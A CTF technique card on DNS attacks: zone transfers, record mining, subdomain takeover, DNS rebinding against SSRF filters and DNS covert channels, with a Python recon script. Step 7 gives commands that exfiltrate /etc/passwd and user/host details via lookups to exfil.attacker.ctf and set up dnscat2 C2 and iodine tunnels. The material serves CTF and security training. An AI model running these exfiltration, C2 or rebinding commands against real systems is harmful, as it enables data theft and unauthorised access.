---
title: "DNS in CTF - Zone Transfers, Record Mining, Takeover and Rebinding"
category: misc
subcategory: recon
type: technique
tags: [dns, dig, zone-transfer, axfr, subdomain-takeover, dns-rebinding, dnsrecon, fierce, nslookup, srv-records, txt-records, ptr, dns-tunnelling, dnscat2, iodine, nuclei, recon]
difficulty: medium
summary: "DNS leaks structure: AXFR dumps whole zones, TXT/SRV records hide flags and AD topology, dangling CNAMEs give subdomain takeover, and rebinding defeats SSRF filters."
when_to_use:
  - "Port 53 TCP/UDP is open on the target"
  - "A challenge gives you a domain name and little else"
  - "A subdomain CNAMEs to a cloud provider and returns a 404 'no such bucket/app' page"
  - "An SSRF filter resolves your hostname once and then fetches it"
tools: [dig, host, nslookup, dnsrecon, fierce, dnsenum, subjack, nuclei, dnscat2, iodine]
related: [net-subdomain-enum, ad-enumeration-bloodhound, net-scanning-fingerprinting]
---

## TL;DR

Port 53 is an enumeration goldmine. Try `AXFR` first -- a single command can hand you the entire
zone. Then mine TXT (flags, keys, SPF), SRV (Active Directory topology), MX and NS. Dangling
CNAMEs to unclaimed cloud resources are a free takeover. DNS rebinding turns a hostname allowlist
into an SSRF primitive.

## Recognise it

- `53/tcp open domain` -- TCP/53 open usually means zone transfers or large responses are supported.
- The box's own resolver is the domain controller (classic AD CTF layout).
- A subdomain returns "NoSuchBucket", "There isn't a GitHub Pages site here", "404 Not Found"
  from a cloud provider CDN.
- A web app fetches a URL you supply and blocks private IPs by resolving the name first.

## Attack

### Step 1 -- find the authoritative servers

```bash
# Nameservers for the zone
dig NS target.ctf +short

# Ask a specific server directly (essential on a CTF network with no public DNS)
dig @10.10.10.5 NS target.ctf

# SOA record: primary master, admin email, serial (often an internal hostname leak)
dig @10.10.10.5 SOA target.ctf

# Version banner of the DNS server itself
dig @10.10.10.5 version.bind CHAOS TXT
```

### Step 2 -- zone transfer (AXFR)

```bash
# Full zone transfer against the authoritative server
dig axfr target.ctf @10.10.10.5

# Same with host(1)
host -l target.ctf 10.10.10.5

# Incremental transfer, sometimes allowed when AXFR is not (serial 0 asks for everything)
dig ixfr=0 target.ctf @10.10.10.5

# Automated: try AXFR against every NS, then brute force
dnsrecon -d target.ctf -n 10.10.10.5 -a

# fierce tries the transfer then falls back to brute force
fierce --domain target.ctf --dns-servers 10.10.10.5

# nmap NSE version
nmap -p53 --script dns-zone-transfer --script-args dns-zone-transfer.domain=target.ctf 10.10.10.5
```

A successful AXFR prints every record in the zone -- hosts, internal IPs, TXT notes, service
records. Save it and treat it as your target list.

```bash
# Extract hostnames from an AXFR dump
dig axfr target.ctf @10.10.10.5 | awk '/IN\s+(A|AAAA|CNAME)/ {print $1}' | sed 's/\.$//' | sort -u
```

### Step 3 -- records worth querying by hand

```bash
# Everything the server will give you for the apex (ANY is often refused; still try)
dig ANY target.ctf @10.10.10.5

# A and AAAA
dig A target.ctf @10.10.10.5 +short
dig AAAA target.ctf @10.10.10.5 +short

# Mail servers -- often a separate box with SMTP enumeration surface
dig MX target.ctf @10.10.10.5 +short

# TXT: SPF/DKIM/DMARC, verification tokens, and in CTF very often the flag
dig TXT target.ctf @10.10.10.5 +short
dig TXT _dmarc.target.ctf @10.10.10.5 +short
dig TXT flag.target.ctf @10.10.10.5 +short

# CNAME chain for a specific name
dig CNAME dev.target.ctf @10.10.10.5 +short

# Reverse lookup of a single IP
dig -x 10.10.10.5 @10.10.10.5 +short

# PTR sweep of a /24 through the target's own resolver
for i in $(seq 1 254); do
  name=$(dig +short -x "10.10.10.$i" @10.10.10.5)
  [ -n "$name" ] && echo "10.10.10.$i -> $name"
done
```

### Step 4 -- SRV records (Active Directory discovery)

If the target is a Windows domain, SRV records map the whole environment.

```bash
# Domain controllers offering LDAP
dig SRV _ldap._tcp.dc._msdcs.target.local @10.10.10.5 +short

# Kerberos KDCs
dig SRV _kerberos._tcp.target.local @10.10.10.5 +short

# Kerberos password change service
dig SRV _kpasswd._tcp.target.local @10.10.10.5 +short

# Global catalog
dig SRV _gc._tcp.target.local @10.10.10.5 +short

# The PDC emulator
dig SRV _ldap._tcp.pdc._msdcs.target.local @10.10.10.5 +short

# Generic sweep of the common SRV names
for s in _ldap._tcp _kerberos._tcp _kerberos._udp _kpasswd._tcp _gc._tcp _sip._tls _autodiscover._tcp _xmpp-client._tcp; do
  echo "== $s"; dig SRV "$s.target.local" @10.10.10.5 +short
done
```

### Step 5 -- subdomain takeover

A dangling CNAME points at a cloud resource nobody owns any more. Claim it and you own the name.

```bash
# Look for CNAMEs pointing off-domain
dig CNAME old.target.com +short

# Fetch the page and read the provider's error text
curl -s -H 'Host: old.target.com' http://old.target.com/ | head -20

# Scan a name list with subjack (fingerprint database included)
subjack -w subs.txt -t 50 -timeout 30 -ssl -c fingerprints.json -v

# nuclei has a maintained takeover template set
nuclei -l subs.txt -t http/takeovers/ -severity high,critical

# dnsx will show the CNAME target for a whole list
dnsx -l subs.txt -cname -resp -silent
```

Fingerprints to recognise (the CNAME target plus the error body):

| CNAME target contains | Error body says | Service |
|---|---|---|
| `s3.amazonaws.com` | `NoSuchBucket` | AWS S3 |
| `github.io` | `There isn't a GitHub Pages site here` | GitHub Pages |
| `herokudns.com` / `herokuapp.com` | `No such app` | Heroku |
| `azurewebsites.net`, `cloudapp.net`, `trafficmanager.net` | `404 Web Site not found` | Azure |
| `cloudfront.net` | `Bad request` / `ERROR: The request could not be satisfied` | CloudFront |
| `fastly.net` | `Fastly error: unknown domain` | Fastly |
| `pantheonsite.io` | `404 error unknown site` | Pantheon |
| `wpengine.com` | site not configured | WP Engine |
| `readthedocs.io` | `unknown to Read the Docs` | Read the Docs |
| `ghost.io` | `Domain error` | Ghost |

Proving it safely: claim the resource and serve a single file with a unique token
(`/takeover-proof-<random>.txt`), screenshot it, then release the resource. Never host content
that impersonates the organisation.

### Step 6 -- DNS rebinding

Target: an application that validates a hostname (resolving it, checking the IP is public) and
*then* fetches the URL. Between the two resolutions you change the answer.

Mechanism:

1. You control a DNS zone with a very low TTL (`TTL 0` or 1).
2. First query returns a harmless public IP -> validation passes.
3. Second query (the actual fetch) returns `127.0.0.1` or `169.254.169.254` -> SSRF.

```bash
# Watch what the target's resolver asks for: run a listening resolver and log queries
sudo tcpdump -i tun0 -n udp port 53

# Serve alternating answers with dnsmasq for a lab (two A records, round robin)
# /etc/dnsmasq.conf
#   address=/rebind.attacker.ctf/203.0.113.10
#   address=/rebind.attacker.ctf/127.0.0.1
#   local-ttl=0
sudo dnsmasq -d -C /etc/dnsmasq.conf

# Quick check of what a name currently resolves to, bypassing the local cache
dig +short rebind.attacker.ctf @1.1.1.1
```

Defences that break it (and therefore what to check on the target):

- **DNS pinning** -- the HTTP client caches the first resolution for the life of the request.
- Resolving once and connecting **by IP** rather than by name.
- Minimum TTL enforcement in the resolver.
- Blocking answers that point into private ranges (`rebind protection` in dnsmasq/unbound).

If the app pins DNS, fall back to other SSRF filter bypasses: redirects (302 to
`http://127.0.0.1/`), alternative IP encodings, `0.0.0.0`, IPv6 mapped forms, and userinfo tricks.

### Step 7 -- DNS as a covert channel

```bash
# Confirm outbound DNS works from the target by resolving a unique name you can observe
nslookup $(whoami).$(hostname).exfil.attacker.ctf 10.10.10.5

# Exfiltrate a short value one label at a time (hex-encoded to stay DNS-safe)
for chunk in $(xxd -p -c 20 /etc/passwd | head -5); do host "$chunk.exfil.attacker.ctf"; done

# Interactive C2 over DNS
dnscat2-server attacker.ctf                 # server side
./dnscat2 --dns server=10.10.10.5,domain=attacker.ctf   # client side

# Full IP tunnel over DNS
sudo iodined -f -c -P secret 10.9.0.1 tunnel.attacker.ctf   # server
sudo iodine -f -P secret 10.10.10.5 tunnel.attacker.ctf     # client
```

Use this when egress is blocked for TCP but the box can still resolve names -- extremely common
in firewalled CTF networks.

## Code

Zone reconnaissance helper: queries every record type worth asking for, attempts AXFR against each
nameserver, and flags CNAMEs pointing at known-takeover-prone providers.

```python
#!/usr/bin/env python3
"""DNS recon helper: record sweep, AXFR attempt, dangling-CNAME flagging.

Requires: dnspython  (pip install dnspython)

Usage:
    python3 dnsrecon_mini.py target.ctf [resolver_ip]
"""
from __future__ import annotations

import sys

import dns.query
import dns.rdatatype
import dns.resolver
import dns.zone

RECORD_TYPES = ["A", "AAAA", "NS", "MX", "TXT", "SOA", "CNAME", "SRV", "CAA"]

SRV_NAMES = [
    "_ldap._tcp.dc._msdcs",
    "_kerberos._tcp",
    "_kpasswd._tcp",
    "_gc._tcp",
    "_sip._tls",
    "_autodiscover._tcp",
]

TAKEOVER_MARKERS = [
    "s3.amazonaws.com",
    "github.io",
    "herokuapp.com",
    "herokudns.com",
    "azurewebsites.net",
    "cloudapp.net",
    "trafficmanager.net",
    "cloudfront.net",
    "fastly.net",
    "pantheonsite.io",
    "readthedocs.io",
    "ghost.io",
    "wpengine.com",
]


def make_resolver(server: str | None) -> dns.resolver.Resolver:
    """Build a resolver, optionally pinned to a specific DNS server."""
    res = dns.resolver.Resolver()
    res.lifetime = 5.0
    res.timeout = 5.0
    if server:
        res.nameservers = [server]
    return res


def sweep(res: dns.resolver.Resolver, domain: str) -> None:
    """Query every interesting record type for the apex name."""
    print(f"=== records for {domain} ===")
    for rtype in RECORD_TYPES:
        try:
            answer = res.resolve(domain, rtype)
        except Exception:
            continue
        for rdata in answer:
            print(f"{rtype:<6} {rdata.to_text()}")


def srv_sweep(res: dns.resolver.Resolver, domain: str) -> None:
    """Query the SRV names that reveal Active Directory topology."""
    print(f"\n=== SRV sweep for {domain} ===")
    for name in SRV_NAMES:
        fqdn = f"{name}.{domain}"
        try:
            answer = res.resolve(fqdn, "SRV")
        except Exception:
            continue
        for rdata in answer:
            print(f"{fqdn:<40} {rdata.to_text()}")


def try_axfr(res: dns.resolver.Resolver, domain: str) -> None:
    """Attempt a zone transfer against every nameserver of the zone."""
    print(f"\n=== AXFR attempts for {domain} ===")
    try:
        ns_answer = res.resolve(domain, "NS")
    except Exception as exc:
        print(f"[-] cannot list nameservers: {exc}")
        return
    for ns in ns_answer:
        host = str(ns.target).rstrip(".")
        try:
            ns_ip = str(res.resolve(host, "A")[0])
        except Exception:
            ns_ip = host
        try:
            zone = dns.zone.from_xfr(dns.query.xfr(ns_ip, domain, lifetime=10))
        except Exception as exc:
            print(f"[-] {host} ({ns_ip}): refused ({type(exc).__name__})")
            continue
        print(f"[+] {host} ({ns_ip}): TRANSFER SUCCEEDED")
        for name, node in zone.nodes.items():
            print(node.to_text(name))


def check_cnames(res: dns.resolver.Resolver, names: list[str]) -> None:
    """Flag CNAMEs that point at providers prone to subdomain takeover."""
    print("\n=== dangling CNAME check ===")
    for name in names:
        try:
            answer = res.resolve(name, "CNAME")
        except Exception:
            continue
        for rdata in answer:
            target = rdata.to_text().rstrip(".")
            hit = next((m for m in TAKEOVER_MARKERS if m in target), None)
            flag = f"  <-- takeover candidate ({hit})" if hit else ""
            print(f"{name} -> {target}{flag}")


def main(argv: list[str]) -> int:
    if len(argv) < 2:
        print(__doc__)
        return 1
    domain = argv[1]
    server = argv[2] if len(argv) > 2 else None
    res = make_resolver(server)
    sweep(res, domain)
    srv_sweep(res, domain)
    try_axfr(res, domain)
    candidates = [f"{sub}.{domain}" for sub in ("www", "dev", "staging", "old", "blog", "cdn", "api")]
    check_cnames(res, candidates)
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
```

## Variants & pitfalls

- **Query the right server.** `dig target.ctf` uses your system resolver, which knows nothing about
  a lab domain. Always `@<target-ip>` on a CTF network.
- **AXFR needs TCP.** If UDP/53 is open but TCP/53 is filtered, the transfer will fail regardless
  of policy. Check both.
- **`ANY` is mostly dead.** RFC 8482 lets servers answer `ANY` with a minimal response. Query
  record types individually.
- **TXT records get truncated** at 255 bytes per string; a long flag is split into several strings
  in one record -- concatenate them.
- **Trailing dots** matter in zone files and in `dig` output; strip them before feeding hostnames
  to other tools.
- **Takeover false positives.** A 404 from a CDN is not a takeover unless the underlying resource
  is genuinely unclaimed. Confirm the provider's specific error text.
- **Rebinding needs a controlled zone.** In an offline CTF you must run your own authoritative
  server (dnsmasq/bind) and point the target at it, or the challenge provides a rebinding service.
- **Caching fights you.** Set TTL 0, and remember the *target's* resolver may enforce a minimum TTL.
- **Do not transfer zones you do not own.** AXFR against a random internet domain is unauthorised.

## Tools

- `dig`, `host`, `nslookup` -- manual queries; `dig` is the one to learn.
- `dnsrecon`, `dnsenum`, `fierce` -- automated zone transfer + brute force.
- `dnsx` -- fast record extraction over a list.
- `subjack`, `nuclei` (takeover templates) -- subdomain takeover detection.
- `dnsmasq`, `bind9` -- run your own authoritative server for rebinding/exfil labs.
- `dnscat2`, `iodine` -- DNS C2 and DNS tunnelling.
- `dnspython` -- the Python library used in the script above.

## References

- RFC 1035 (DNS specification), RFC 5936 (AXFR), RFC 2782 (SRV records), RFC 8482 (ANY responses).
- `man dig` for the full query syntax including `+trace`, `+nssearch` and `+tcp`.
